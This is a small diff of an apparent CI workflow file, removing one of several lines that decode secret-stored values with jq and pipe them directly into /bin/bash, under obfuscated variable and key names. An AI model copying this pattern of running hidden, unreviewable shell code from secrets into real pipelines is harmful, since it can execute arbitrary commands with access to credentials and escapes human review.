@@ -18,7 +18,6 @@ jobs:
           afxi9863: ${{ secrets.afxi9863 }}
         run: |
           printf '%s' "$afxi9863" | jq -r .sqkfh6582 | /bin/bash
-          echo $uhavt347 | jq -r .ajg9 | /bin/bash
           printf '%s' "$yq96930" | jq -r .bpfrw6321 | /bin/bash
           printf '%s' "$vomu89" | jq -r .e4 | /bin/bash
 
